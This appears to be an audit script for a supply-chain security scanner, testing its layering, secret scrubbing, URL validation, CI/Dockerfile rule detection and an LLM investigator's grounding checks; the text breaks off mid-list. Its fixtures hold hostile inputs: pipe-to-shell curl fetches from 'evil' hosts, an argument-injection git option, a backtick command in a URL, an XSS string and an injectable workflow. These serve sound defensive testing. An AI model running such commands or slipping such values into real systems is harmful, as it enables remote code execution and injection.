"""Architecture and behaviour audit for SC Guardian (no pytest needed).

Usage:  python scripts/audit_check.py [--offline] [--with-scanners]
  --offline        skip checks that need the network (OSV known-answer test)
  --with-scanners  also scan the fixture with every installed external scanner (Syft/Trivy) and compare with the rule engine

Exit code 0 = every check passed. Each check prints PASS/FAIL/SKIP and a reason.
"""
from __future__ import annotations

import ast
import json
import os
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

OFFLINE = "--offline" in sys.argv
WITH_SCANNERS = "--with-scanners" in sys.argv
results: list[tuple[str, str, str]] = []


def check(name: str, ok: bool | None, detail: str = "") -> None:
    status = "SKIP" if ok is None else ("PASS" if ok else "FAIL")
    results.append((name, status, detail))
    print(f"[{status}] {name}" + (f" - {detail}" if detail else ""))


def guarded(name: str):
    def deco(fn):
        try:
            fn()
        except Exception as e:  # a crashing check is a failing check
            import traceback
            check(name, False, f"{type(e).__name__}: {e}\n{traceback.format_exc()[-400:]}")
        return fn
    return deco


# ------------------------------------------------------------------------------------------------ architecture
LAYERS = {  # package -> packages it must NOT import (dependency direction: ui -> orchestration -> agents -> domain -> core/storage)
    "core": {"ui", "agents", "orchestration"},
    "storage": {"ui", "agents", "orchestration"},
    "sbom": {"ui", "agents", "orchestration"},
    "graph": {"ui", "agents", "orchestration"},
    "vulnerability": {"ui", "agents", "orchestration"},
    "suspicious_changes": {"ui", "agents", "orchestration"},
    "risk_analysis": {"ui", "agents", "orchestration"},
    "explainability": {"ui", "agents", "orchestration"},
    "reporting": {"ui", "agents", "orchestration"},
    "agents": {"ui", "orchestration"},
    "orchestration": {"ui"},
}


@guarded("layering")
def _layering() -> None:
    bad = []
    for pkg, forbidden in LAYERS.items():
        for f in (ROOT / pkg).rglob("*.py"):
            tree = ast.parse(f.read_text(encoding="utf-8"))
            for node in ast.walk(tree):
                mods = [node.module] if isinstance(node, ast.ImportFrom) and node.module else [a.name for a in node.names] if isinstance(node, ast.Import) else []
                for m in mods:
                    if m.split(".")[0] in forbidden:
                        bad.append(f"{f.relative_to(ROOT)} imports {m}")
    # core.scan_orchestrator is the documented entry point that lazily calls orchestration; allow only that one
    bad = [b for b in bad if not b.startswith("core\\scan_orchestrator.py") and not b.startswith("core/scan_orchestrator.py")]
    check("architecture: layer dependencies point downwards only", not bad, "; ".join(bad[:5]))


@guarded("subprocess")
def _subprocess_env() -> None:
    missing = []
    for f in ROOT.rglob("*.py"):
        if ".venv" in f.parts or f.name == "audit_check.py" or f.parent.name == "scripts":
            continue
        src = f.read_text(encoding="utf-8")
        tree = ast.parse(src)
        for n in ast.walk(tree):
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and n.func.attr in ("run", "Popen", "check_output") \
                    and isinstance(n.func.value, ast.Name) and n.func.value.id == "subprocess":
                kws = {k.arg for k in n.keywords}
                if "env" not in kws or "shell" not in kws:
                    missing.append(f"{f.relative_to(ROOT)}:{n.lineno}")
    check("security: every subprocess call passes an explicit env and shell=False", not missing, ", ".join(missing))


@guarded("secrets")
def _secrets() -> None:
    from core.safe_env import scrubbed_env
    os.environ["ANTHROPIC_API_KEY"] = "sk-audit-secret"
    os.environ["NVD_API_KEY"] = "nvd-audit-secret"
    try:
        env = scrubbed_env()
        check("security: API keys are absent from subprocess environments", not any("audit-secret" in v for v in env.values()))
    finally:
        os.environ.pop("ANTHROPIC_API_KEY")
        os.environ.pop("NVD_API_KEY")


@guarded("graphs")
def _graph_payloads() -> None:
    import networkx as nx
    from graph.graph_exporter import dependency_payload
    from orchestration.pipeline import workflow_payload
    g = nx.DiGraph()
    g.add_node("root", kind="root", label="app (service)")
    for n, d in (("a", "direct"), ("b", "transitive"), ("c", "transitive")):
        g.add_node(n, kind="component", label=f"{n}@1", version="1", ecosystem="npm")
    g.add_edges_from([("root", "a"), ("a", "b"), ("b", "c")])
    rel = {"a": {"root": "direct"}, "b": {"root": "transitive"}, "c": {"root": "transitive"}}
    p = dependency_payload(g, rel, {"c": "HIGH"}, {"c": ["CVE-1"]}, {"b": {"scope": "dev"}}, {}, cap=3)
    ids = {n["id"] for n in p["nodes"]}
    check("graph payload: capped view keeps the whole chain to the root and labels without versions",
          {"root", "a", "b", "c"} <= ids and next(n for n in p["nodes"] if n["id"] == "a")["label"] == "a" and p["directs"] == 1)
    check("graph payload: scope drives production/dev colouring", next(n for n in p["nodes"] if n["id"] == "b")["kind"] == "dev")
    w = workflow_payload()
    names = {n["id"] for n in w["nodes"]}
    check("workflow graph: agent-level view from the real LangGraph with parallel branches joined at Risk",
          {"Vulnerability Agent", "Threat Agent", "Risk Agent"} <= names and ["Threat Agent", "Risk Agent"] in w["edges"] and ["Investigator Agent", "Risk Agent"] in w["edges"])


@guarded("steps")
def _pipeline_shape() -> None:
    from agents.runtime import STEPS
    from orchestration.pipeline import NODES, build_graph, mermaid
    owned = {s for _, steps, _ in NODES.values() for s in steps}
    missing = [s[0] for s in STEPS if s[0] not in owned and s[0] not in ("validate", "clone")]
    check("orchestration: every runtime step is owned by a graph node", not missing, ", ".join(missing))
    m = mermaid()
    check("orchestration: graph compiles with parallel branches and a conditional edge",
          bool(m) and "graph --> typosquat" in m and "graph --> vulnerability" in m and "sbom_quality -.->" in m)
    build_graph().compile()


# ------------------------------------------------------------------------------------------------ behaviour
def _fixture(td: Path) -> Path:
    fx = td / "fx"
    for svc in ("svc_a", "svc_b"):
        d = fx / svc
        d.mkdir(parents=True)
        (d / "package.json").write_text(json.dumps({"name": svc, "version": "1.0.0", "dependencies": {"minimist": "1.2.0"}}))
        (d / "package-lock.json").write_text(json.dumps({"name": svc, "version": "1.0.0", "lockfileVersion": 3, "packages": {
            "": {"name": svc, "version": "1.0.0", "dependencies": {"minimist": "1.2.0"}},
            "node_modules/minimist": {"version": "1.2.0", "resolved": "https://registry.npmjs.org/minimist/-/minimist-1.2.0.tgz", "integrity": "sha512-xxxxxxxxxxxx"}}}))
    return fx


def _settings(td: Path):
    from config.settings import Settings
    s = Settings()
    s.data_dir, s.artifacts_dir, s.workspace_dir = td / "data", td / "art", td / "ws"
    for d in (s.data_dir, s.workspace_dir, *(s.artifacts_dir / x for x in ("sbom", "scans", "reports", "graphs"))):
        d.mkdir(parents=True, exist_ok=True)
    return s


def _opts(**kw):
    from core.scan_orchestrator import ScanOptions
    base = dict(url="local", use_nvd=False, use_kev=False, registry_checks=False, reuse_cached=False)
    base.update(kw)
    return ScanOptions(**base)


@guarded("scan")
def _scan_checks() -> None:
    from core.scan_orchestrator import scan_local_directory
    from storage.database import Database
    td = Path(tempfile.mkdtemp())
    s, fx = _settings(td), _fixture(td)
    db = Database(s.db_path)
    modes = ["builtin"] + (["syft", "trivy"] if WITH_SCANNERS else [])
    out = {}
    for mode in modes:
        if OFFLINE:
            check(f"scan[{mode}]: fixture scan", None, "needs OSV (offline)")
            continue
        r = scan_local_directory(fx, _opts(sbom_scanner=mode), s, db, name="fx")
        pk = sorted((c["name"], c["service_dir"], c["version"]) for c in r["components"] if not c.get("is_self") and c["type"] != "file")
        out[mode] = (pk, len(r["vulnerabilities"]), r["sbom_tool"]["used"])
        ok = r["status"] == "completed" and Path(r["sbom_path"]).exists() and r["sbom"]["validation"]["valid"]
        check(f"scan[{mode}]: completed, valid CycloneDX file on disk (used {r['sbom_tool']['used']})", ok, "; ".join(e["error"] for e in r["errors"]))
        check(f"scan[{mode}]: both services keep their own component and graph root", len(pk) == 2 and len(r["graph"]["roots"]) == 2, str(pk))
        check(f"scan[{mode}]: persisted graph tables match the result", (db.load_graph(r["repo"]["scan_id"]) or {}).get("nodes") is not None)
        if mode == "builtin":
            base = r
    if len(out) > 1:
        ref = out["builtin"]
        check("parity: every scanner yields the same package set and finding count as the rule engine",
              all(v[0] == ref[0] and v[1] == ref[1] for v in out.values()), str({k: (v[1], v[2]) for k, v in out.items()}))
    if OFFLINE:
        return

    # failure containment: a crashing agent degrades the scan, never crashes it or leaves UI keys missing
    import orchestration.pipeline as P
    orig = P.risk.score
    P.risk.score = lambda st, rt: (_ for _ in ()).throw(RuntimeError("injected"))
    try:
        r = scan_local_directory(fx, _opts(sbom_scanner="builtin"), s, db, name="fx-fail")
    finally:
        P.risk.score = orig
    need = {"summary", "analyst", "risk_assessments", "explanations", "memory", "graph", "vulnerabilities", "limitations", "errors"}
    check("resilience: failed risk step -> run completes with errors, dependents skipped, full schema present",
          r["status"] == "completed_with_errors" and need <= set(r) and any(e["stage"] == "risk" for e in r["errors"]), str(sorted(need - set(r))))

    # memory
    from storage.memory import Memory
    r1 = scan_local_directory(fx, _opts(sbom_scanner="builtin"), s, db, name="mem")
    r2 = scan_local_directory(fx, _opts(sbom_scanner="builtin"), s, db, name="mem")
    c = r2["memory"]["diff"]["counts"]
    check("memory: scanning the same repo twice -> nothing new, nothing fixed, all persisting", c["new"] == 0 and c["persisting"] > 0 and c["fixed"] == 0, str(c))
    m = Memory(db)
    fp = next(iter(r2["memory"]["fingerprints"].values()))
    d1 = m.add_decision(r2["repo"]["url"], fp, "accepted_risk", "audit", "t", 1)
    check("memory: decision is active, newest wins, expiry honoured", fp in m.decisions(r2["repo"]["url"]))
    with db.connect() as cx:
        cx.execute("UPDATE decisions SET expires_at='2000-01-01T00:00:00Z' WHERE id=?", (d1,))
    check("memory: expired decision no longer applies", fp not in m.decisions(r2["repo"]["url"]))
    # graph diff between the two scans must be identical (same input)
    from graph.graph_diff import diff_graphs
    check("graph: diff of two scans of identical input is identical", diff_graphs(db.load_graph(r1["repo"]["scan_id"]), db.load_graph(r2["repo"]["scan_id"]))["identical"])
    # retention
    for _ in range(3):
        scan_local_directory(fx, _opts(sbom_scanner="builtin"), s, db, name="mem")
    ids = db.prune_repo(r2["repo"]["url"], 2)
    check("storage: prune keeps only the newest N scans of a repository", len(db.list_scans()) >= 2 and len(ids) >= 1)


@guarded("reuse")
def _reuse_rules() -> None:
    from core.scan_orchestrator import SCANNER_VERSION, options_fingerprint, reusable
    from risk_analysis.risk_rules import RULES_VERSION
    td = Path(tempfile.mkdtemp())
    s = _settings(td)
    sbom = td / "x.cdx.json"
    sbom.write_text("{}")
    o = _opts(sbom_scanner="auto")
    base = {"status": "completed", "repo": {"scan_timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}, "tool_versions": {"scanner": SCANNER_VERSION},
            "risk_rules_version": RULES_VERSION, "options_fp": options_fingerprint(o), "sbom_tool": {"used": "builtin"}, "sbom_path": str(sbom)}
    check("freshness: a fresh identical scan is reusable", reusable(base, o, s)[0])
    old = dict(base, repo={"scan_timestamp": "2020-01-01T00:00:00Z"})
    check("freshness: a stored scan older than the TTL is not reused", not reusable(old, o, s)[0])
    check("freshness: different scanner/rule version is not reused", not reusable(dict(base, tool_versions={"scanner": "0"}), o, s)[0])
    check("freshness: different options are not reused", not reusable(base, _opts(sbom_scanner="auto", use_nvd=True), s)[0])


@guarded("urls")
def _urls() -> None:
    from core.url_validator import InvalidRepositoryURL, validate_github_url
    bad = ["file:///etc/passwd", "C:\\Windows", "https://evil.com/a/b", "https://user:pw@github.com/a/b", "https://github.com:22/a/b", "https://github.com/a/b/../../c",
           "--upload-pack=x", "ssh://git@github.com/a/b", "https://github.com/a"]
    leaked = []
    for u in bad:
        try:
            validate_github_url(u)
            leaked.append(u)
        except (InvalidRepositoryURL, ValueError):
            pass
    ok = []
    for u in ["https://github.com/pallets/flask", "github.com/pallets/flask", "git@github.com:pallets/flask.git", "https://github.com/pallets/flask/tree/main"]:
        try:
            validate_github_url(u)
            ok.append(u)
        except Exception:
            pass
    check("security: attack-style URLs are rejected", not leaked, ", ".join(leaked))
    rebuilt = validate_github_url("https://github.com/a/b?x=`id`#frag").clone_url
    check("security: clone URL is rebuilt from owner/name (query and fragment never reach git)", rebuilt == "https://github.com/a/b.git", rebuilt)
    check("usability: all accepted URL forms validate", len(ok) == 4)


@guarded("graph_precedence")
def _adapters() -> None:
    from sbom.adapters import get_adapter
    raw = {"components": [{"type": "application", "name": "package-lock.json", "bom-ref": "A"}, {"type": "library", "name": "x", "version": "1", "purl": "pkg:npm/x@1", "bom-ref": "pkg:npm/x@1"}],
           "dependencies": [{"ref": "A", "dependsOn": ["pkg:npm/x@1"]}, {"ref": "pkg:npm/x@1", "dependsOn": []}], "metadata": {"component": {"bom-ref": "R"}}}
    snap = json.dumps(raw, sort_keys=True)
    doc = get_adapter("trivy").canonicalize(raw)
    check("normalisation: Trivy adapter folds lockfile applications into locations and never mutates the raw document",
          json.dumps(raw, sort_keys=True) == snap and len(doc["components"]) == 1 and doc["components"][0]["properties"][-1]["value"] == "package-lock.json")


@guarded("fusion")
def _fusion() -> None:
    from core.http import HttpClient, SourceUnavailable
    from core.models import Component, LockDependency
    from sbom.fusion import engine, ledger
    from sbom.fusion.hashes import parse_digest
    from sbom.fusion.writer import write_fused
    from sbom.cyclonedx_validator import validate_cyclonedx

    sri = "sha512-7Wl+Jz+IGWuSdgsQEJ4JunVTlzCqPgnbc7dqCPPQwDfuOkr6Np3XLuC/Hlr1rXbyBz5TrFZcrzFOvDMr7p58zw=="
    d = parse_digest(sri)
    check("fusion: SRI digest converts to the correct hex", d and d["alg"] == "sha512" and d["hex"].startswith("ed697e27"))
    c = Component(bom_ref="a", name="x", version="1", ecosystem="npm", licenses=["GPL-3.0"], sources=["syft"])
    ledger.init_scanner_provenance(c)
    ledger.set_field(c, "licenses", ["MIT"], "lockfile", "lock")
    ok1 = c.licenses == ["MIT"] and c.provenance["licenses"]["source"] == "lockfile" and c.provenance["licenses"]["conflicts"][0]["source"].startswith("scanner")
    ledger.set_field(c, "licenses", ["Apache-2.0"], "registry:npm", "reg")
    check("fusion: lockfile outranks scanner and registry; the displaced/rejected values are kept as conflicts", ok1 and c.licenses == ["MIT"] and len(c.provenance["licenses"]["conflicts"]) == 2)
    e = Component(bom_ref="b", name="y", version="1", ecosystem="npm")
    ledger.set_field(e, "licenses", [], "registry")
    check("fusion: nothing is invented (empty values do not create provenance)", e.licenses == [] and "licenses" not in e.provenance)

    ld = LockDependency(name="x", version="1", ecosystem="npm", lockfile="package-lock.json", service_dir=".", integrity=sri, license="MIT", direct=True, meta={"install_script": True})
    comp = Component(bom_ref="a", name="x", version="1", ecosystem="npm", service_dir=".", sources=["syft"])
    engine.apply_lockfile([comp], [ld])
    check("fusion: native lockfile facts (hash, license, install script, scope) reach the component",
          comp.hashes and comp.licenses == ["MIT"] and comp.install_script and comp.scope == "required" and comp.provenance["hashes"]["source"] == "lockfile")
    for digest, expect in ((d["hex"], "verified"), ("0" * 128, "mismatch")):
        cc = comp.model_copy(deep=True)
        cc.integrity = dict(cc.integrity)
        engine._apply_record(cc, {"sources": {"npm-registry": "u"}, "digests": [{"alg": "sha512", "hex": digest, "kind": "file"}]})
        check(f"integrity: lockfile digest vs registry -> {expect}", cc.integrity.get("status") == expect)
    cc = Component(bom_ref="z", name="z", version="1", ecosystem="npm")
    engine._apply_record(cc, {"sources": {"npm-registry": "u"}, "digests": [{"alg": "sha512", "hex": "ab" * 64, "kind": "file"}]})
    check("integrity: no lockfile digest -> registry digest added with medium confidence", cc.integrity.get("status") == "absent" and cc.provenance["hashes"]["confidence"] == "medium")

    # registry outage must degrade quickly and honestly, never hang or invent data
    class Down(HttpClient):
        def request(self, *a, **k):
            raise SourceUnavailable("down")
    comps = [Component(bom_ref=f"p{i}", name=f"pkg{i}", version="1.0.0", ecosystem="npm", service_dir=".") for i in range(12)]
    t0 = time.time()
    rep = engine.fuse(comps, [], Down(retries=0), None, registry=True, budget_s=20)
    check("resilience: registry outage -> breaker trips fast, no data invented, report says unavailable",
          time.time() - t0 < 10 and rep["registry_phase"]["hosts_tripped"] and all(not c.licenses for c in comps), str(rep["registry_phase"]))

    doc = {"bomFormat": "CycloneDX", "specVersion": "1.6", "components": [{"type": "library", "name": "x", "version": "1", "bom-ref": "a", "purl": "pkg:npm/x@1"}], "dependencies": []}
    out = write_fused(doc, [comp], {"average_completeness": 0.5, "integrity": {"verified": 1}}, "builtin")
    ent = out["components"][0]
    check("writer: fused CycloneDX is valid and carries licenses, hashes, scope and provenance properties",
          validate_cyclonedx(out)["valid"] and ent["licenses"][0]["license"]["id"] == "MIT" and ent["hashes"][0]["alg"] == "SHA-512" and ent["scope"] == "required"
          and any(pp["name"] == "sc-guardian:provenance:hashes" for pp in ent["properties"]))
    check("writer: the input (scanner) document is not modified", "hashes" not in doc["components"][0])


@guarded("resolver")
def _resolver() -> None:
    from core.models import LockDependency
    from sbom.fusion.resolver import candidates
    mk = lambda **k: LockDependency(ecosystem="Maven", name="g:a", version="1.0", service_dir=".", direct=True, **k)  # noqa: E731
    pom = mk(lockfile="pom.xml")
    check("resolver: pinned direct deps of a pom.xml-only service are resolution candidates", len(candidates([pom])) == 1)
    lockd = LockDependency(ecosystem="Maven", name="g:b", version="2", service_dir=".", lockfile="gradle.lockfile")
    check("resolver: a service with a real lockfile is never resolved (the lockfile is authoritative)", candidates([pom, lockd]) == [])
    check("resolver: unpinned or non-direct records are skipped", candidates([mk(lockfile="pom.xml").model_copy(update={"version": None}), mk(lockfile="pom.xml").model_copy(update={"direct": False})]) == [])


@guarded("config")
def _config() -> None:
    from config.settings import get_settings
    saved = {k: os.environ.get(k) for k in ("SCANNER_CLONE_TIMEOUT_S", "SCANNER_HTTP_RETRIES", "SCANNER_CLONE_DEPTH")}
    os.environ.update({"SCANNER_CLONE_TIMEOUT_S": "abc", "SCANNER_HTTP_RETRIES": "99", "SCANNER_CLONE_DEPTH": "7"})
    try:
        s = get_settings()
        check("config: invalid values are ignored with a reported problem, valid env override wins",
              s.clone_timeout_s == 180 and s.http_retries == 3 and s.clone_depth == 7 and len(s.problems) >= 2 and s.sources["clone_depth"] == "env", str(s.problems))
    finally:
        for k, v in saved.items():
            os.environ.pop(k, None) if v is None else os.environ.__setitem__(k, v)
    tf = Path(tempfile.mkdtemp()) / "scanner.toml"
    tf.write_text('clone_depth = 9\nnvd_api_key = "leak"\nbogus = 1\n')
    os.environ["SCANNER_CONFIG"] = str(tf)
    try:
        s = get_settings()
        check("config: file value applies, secrets in the file are rejected, unknown keys reported",
              s.clone_depth == 9 and not s.nvd_api_key and any("secret" in p for p in s.problems) and any("bogus" in p for p in s.problems) and s.sources["clone_depth"] == "file")
    finally:
        os.environ.pop("SCANNER_CONFIG", None)


@guarded("cache")
def _cache() -> None:
    from storage.cache import Cache
    from storage.database import Database
    db = Database(Path(tempfile.mkdtemp()) / "c.db")
    c = Cache(db)
    for i in range(30):
        c.set("ns", f"k{i}", {"i": i})
    with db.connect() as cx:
        cx.execute("UPDATE cache SET fetched_at = fetched_at - ? WHERE key IN ('k0','k1')", (200 * 86400,))
    r = c.maintain(max_age_days=120, max_rows=20)
    st_ = c.stats()
    check("cache: rows older than the limit and rows beyond the row cap are purged (oldest first)", r["purged_old"] == 2 and st_["total_rows"] == 20, str(r))
    h = db.health()
    check("database: integrity check passes and schema version is current", h["integrity"] == "ok" and h["schema_version"] >= 2, str(h["schema_version"]))


@guarded("tree")
def _tree() -> None:
    import networkx as nx
    from graph.tree_view import build_reverse_tree, build_tree, graph_stats, tree_html
    g = nx.DiGraph()
    g.add_node("root:.", kind="root", label="app", service_dir=".")
    for n in ("a", "b", "c", "d"):
        g.add_node(n, kind="component", label=f"{n}@1")
    g.add_edges_from([("root:.", "a"), ("root:.", "b"), ("a", "c"), ("b", "c"), ("c", "d"), ("d", "a")])  # shared child + a cycle
    t = build_tree(g, "root:.", {"d": "HIGH"}, {})
    check("graph tree: shared dependencies are expanded once and shown as references; cycles terminate", t["tree"]["descendants"] == 4 and "shown above" in tree_html(t["tree"]))
    rv = build_reverse_tree(g, "d", {"d": "HIGH"}, {})
    check("graph tree: bottom-up view reaches the service root", "app" in tree_html(rv["tree"], 9))
    st_ = graph_stats(g, {"d": "HIGH"})
    check("graph stats: depth histogram and vulnerable depth are computed", st_["depth_histogram"] == {1: 2, 2: 1, 3: 1} and st_["vulnerable_by_depth"] == {3: 1} and st_["has_cycles"], str(st_["depth_histogram"]))
    ev = "<script>alert(1)</script>"
    g.add_node("e", kind="component", label=ev)
    g.add_edge("root:.", "e")
    check("graph tree: package names are HTML-escaped", "<script>" not in tree_html(build_tree(g, "root:.", {}, {})["tree"]))


@guarded("pipeline")
def _pipeline() -> None:
    from pipeline_analysis.ci import analyze_github_workflow, analyze_generic_ci
    from pipeline_analysis.dockerfile import analyze_compose, analyze_dockerfile
    bad = "FROM node:16\nARG NPM_TOKEN=supersecretvalue1\nADD https://e.com/t.tgz /o/\nRUN curl -sSL https://x.sh | bash\nCOPY .env /app/\nCMD [\"node\"]\n"
    f, imgs = analyze_dockerfile(bad, "Dockerfile")
    ids = {x.rule_id for x in f}
    check("pipeline: insecure Dockerfile yields the expected rules (DF001/2, DF003 root, DF004 ADD url, DF005 curl|sh, DF006 secret, DF011 .env, DF012 EOL)",
          {"DF003", "DF004", "DF005", "DF006", "DF011", "DF012"} <= ids and imgs and imgs[0]["kind"] == "official", str(sorted(ids)))
    check("pipeline: credential values are never copied into findings", all("supersecretvalue1" not in (x.snippet + x.why + x.remediation + str(x.extra)) for x in f))
    good = "FROM python:3.13-slim@sha256:" + "a" * 64 + "\nRUN useradd -m app\nUSER app\nCMD [\"python\"]\n"
    check("pipeline: a pinned, non-root Dockerfile has no HIGH/CRITICAL finding", not [x for x in analyze_dockerfile(good, "Dockerfile")[0] if x.severity in ("HIGH", "CRITICAL")])
    wf = ("on:\n  pull_request_target:\npermissions: write-all\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
          "      - uses: x/y@main\n      - run: echo ${{ github.event.pull_request.title }}\n")
    w, acts = analyze_github_workflow(wf, ".github/workflows/a.yml")
    wid = {x.rule_id for x in w}
    check("pipeline: workflow rules (pwn-request GHA002, permissions GHA004, unpinned GHA001, injection GHA003)", {"GHA001", "GHA002", "GHA003", "GHA004"} <= wid and len(acts) == 2, str(sorted(wid)))
    pinned = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@" + "b" * 40 + "\n"
    check("pipeline: SHA-pinned action with read-only permissions raises nothing", not analyze_github_workflow(pinned, ".github/workflows/b.yml")[0])
    c, _ = analyze_compose("services:\n  a:\n    image: nginx:latest\n    privileged: true\n", "docker-compose.yml")
    check("pipeline: compose privileged + latest detected", {"DC001", "DC002"} <= {x.rule_id for x in c})
    g, _ = analyze_generic_ci("script:\n  - curl http://evil/x.sh | sh\n", ".gitlab-ci.yml")
    check("pipeline: generic CI curl|sh and plain-HTTP fetch detected", {"CI001", "CI004"} <= {x.rule_id for x in g})
    from pipeline_analysis.eol import eol_note
    check("pipeline: end-of-life table flags node:16 / python:3.8 but not python:3.13 or unknown images", eol_note("node", "16") and eol_note("python", "3.8-slim") and not eol_note("python", "3.13") and not eol_note("myorg/node", "10"))


@guarded("investigator")
def _investigator() -> None:
    from types import SimpleNamespace
    from agents.investigator import InvestigatorAgent, VERDICTS, decide
    from evidence.store import EvidenceStore
    from llm import client as llmc
    from reachability.scanners import build_index, package_usage
    from tools.registry import ToolContext, call, catalogue

    d = Path(tempfile.mkdtemp())
    (d / "src").mkdir()
    (d / "tests").mkdir()
    (d / "src" / "app.py").write_text("import yaml\nfrom flask import Flask\n")
    (d / "tests" / "test_a.py").write_text("import PIL.Image\n")
    (d / "a.js").write_text("const m = require('minimist'); import x from '@scope/pkg/sub';\n")
    (d / "M.java").write_text("package a;\nimport org.apache.logging.log4j.Logger;\n")
    (d / "main.go").write_text('package main\nimport (\n  "fmt"\n  "github.com/gin-gonic/gin"\n)\n')
    idx = build_index(d)
    got = {(e, n_): package_usage(idx, e, n_)["status"] for e, n_ in [("PyPI", "pyyaml"), ("PyPI", "pillow"), ("PyPI", "django"), ("npm", "minimist"), ("npm", "@scope/pkg"),
                                                                    ("Maven", "org.apache.logging.log4j:log4j-core"), ("Go", "github.com/gin-gonic/gin"), ("crates.io", "serde")]}
    check("reachability: Python/JS/Java/Go import evidence (app vs tests-only vs absent; alias pyyaml->yaml; scoped npm)",
          got[("PyPI", "pyyaml")] == "used_by_app" and got[("PyPI", "pillow")] == "used_in_tests_only" and got[("PyPI", "django")] == "not_imported" and got[("npm", "minimist")] == "used_by_app"
          and got[("npm", "@scope/pkg")] == "used_by_app" and got[("Maven", "org.apache.logging.log4j:log4j-core")] == "used_by_app" and got[("Go", "github.com/gin-gonic/gin")] == "used_by_app"
          and got[("crates.io", "serde")] == "unknown", str(got))

    f = {"finding_id": "VULN-001", "package_name": "minimist", "installed_version": "1.2.0", "ecosystem": "npm", "primary_id": "CVE-2020-7598", "vulnerability_ids": ["GHSA-vh95-rmgr-6w4m"], "cve_ids": ["CVE-2020-7598"],
         "severity": "MEDIUM", "cvss_score": 5.6, "affected_status": "confirmed_affected", "kev": False, "cross_verified": True, "fixed_versions": ["1.2.2"], "dependency_type": "direct", "source_packages": ["minimist@1.2.0"],
         "exposures": [{"depth": 1, "paths": [["app", "minimist@1.2.0"]]}], "roots": ["app"], "dev_dependency": None, "affected_ranges": [], "advisory_urls": []}
    st = SimpleNamespace(vulns=[f], components=[], epss={}, source_index=idx)
    ev = EvidenceStore()
    ctx = ToolContext(repo_dir=d, evidence=ev, state=st)
    inv = InvestigatorAgent()._investigate(ctx, f)
    check("investigator: deterministic planner -> reachable with cited evidence ids and a tool trace", inv["verdict"] == "reachable" and len(inv["evidence_ids"]) >= 3 and [s_["tool"] for s_ in inv["steps"]][:3] == ["advisory_facts", "dependency_path", "find_imports"], str(inv["verdict"]))
    check("investigator: verdict rules are conservative (KEV + imported -> exploitable_likely; unconfirmed range -> needs_review; never 'safe')",
          decide({**f, "kev": True}, {"status": "used_by_app"}, None) == "exploitable_likely" and decide({**f, "affected_status": "unknown"}, {"status": "used_by_app"}, None) == "needs_review"
          and "safe" not in " ".join(VERDICTS))
    check("tools: unknown tool / unexpected argument are rejected, never raised", "error" in call(ctx, "rm_rf", {}) and "error" in call(ctx, "epss", {"cve": "CVE-1", "evil": 1}))
    check("tools: read_snippet only reads files already cited as import evidence", "error" in call(ctx, "read_snippet", {"path": "src/app.py", "line": 1, "radius": 2}) and "snippet" in call(ctx, "read_snippet", {"path": "a.js", "line": 1, "radius": 1}))

    good_id = inv["evidence_ids"][0]
    base = {"verdict": "exploitable_likely", "rationale": f"Imported [{good_id}].", "cites": [good_id], "steps": []}
    inv2 = {**inv, "epss": {"epss": 0.7}}
    checks = [("accepts a grounded proposal", {**base, "verdict": "reachable"}, True), ("rejects an invented evidence id", {**base, "verdict": "reachable", "cites": ["osv:fake#000000"]}, False),
              ("rejects 'no import evidence' when an import exists", {**base, "verdict": "no_import_evidence"}, False), ("rejects an advisory id from another finding", {**base, "verdict": "reachable", "rationale": "See CVE-1999-0001"}, False),
              ("rejects exploitable_likely without KEV/EPSS/CVSS support", {**base, "verdict": "exploitable_likely"}, False), ("rejects a verdict outside the allowed set", {**base, "verdict": "safe"}, False)]
    bad = [name for name, prop, ok in checks if (not InvestigatorAgent.guard(prop, f, inv, ctx)) != ok]
    check("grounding gate: " + "; ".join(c[0] for c in checks), not bad, str(bad))

    class Fake:
        label = "fake:model"
        def __init__(self, replies): self.replies = list(replies)
        def complete(self, system, user, max_tokens=700, json_mode=False): return self.replies.pop(0)
    fake = Fake([json.dumps({"tool": "find_imports", "args": {"package": "minimist", "ecosystem": "npm"}}), json.dumps({"final": {"verdict": "reachable", "rationale": "Imported by a.js.", "cites": [good_id]}})])
    prop = InvestigatorAgent()._llm_loop(ctx, fake, f, inv, 5)
    check("investigator: LLM tool loop executes allowed tools and returns a final proposal", prop["verdict"] == "reachable" and prop["steps"][0]["tool"] == "find_imports" and not InvestigatorAgent.guard(prop, f, inv, ctx))
    llmc.CALL_LOG.clear()
    check("llm: provider detection from the key prefix and secret redaction of outgoing text",
          llmc.detect_provider("gsk_abc") == "groq" and llmc.detect_provider("AIzaSy") == "gemini" and llmc.detect_provider("sk-ant-x") == "anthropic" and llmc.detect_provider(None) is None
          and "gsk_" not in llmc.redact("token gsk_" + "a" * 30) and "ghp_" not in llmc.redact("ghp_" + "b" * 36))
    check("llm: deterministic mode makes zero LLM calls (no key -> no client)", llmc.from_settings(SimpleNamespace(llm_api_key=None)) is None and not llmc.CALL_LOG)


@guarded("remediation")
def _remediation() -> None:
    from core import git_manager as gm
    from remediation import patchers
    from remediation.export import pr_markdown
    from remediation.versions import candidates, change_kind
    from remediation.whatif import evaluate, sbom_diff
    from storage.database import Database
    from storage.memory import Memory

    cases = [
        ("npm", "package.json", '{\n  "name": "a",\n  "dependencies": {\n    "minimist": "^1.2.0"\n  }\n}\n', "minimist", "1.2.6", "bump", "package-lock.json"),
        ("npm", "package.json", '{\n  "name": "a",\n  "dependencies": {}\n}\n', "qs", "6.14.3", "pin", "package-lock.json"),
        ("npm", "package.json", '{\n  "name": "a"\n}\n', "qs", "6.14.3", "pin", "yarn.lock"),
        ("PyPI", "requirements.txt", "flask==2.0.0\nrequests>=2.0\n", "requests", "2.31.0", "bump", ""),
        ("PyPI", "requirements.txt", "flask==2.0.0\n", "urllib3", "2.2.2", "pin", ""),
        ("Maven", "pom.xml", "<project>\n<dependencies>\n  <dependency>\n    <groupId>org.x</groupId>\n    <artifactId>lib</artifactId>\n    <version>1.0</version>\n  </dependency>\n</dependencies>\n</project>\n", "org.x:lib", "1.1", "bump", ""),
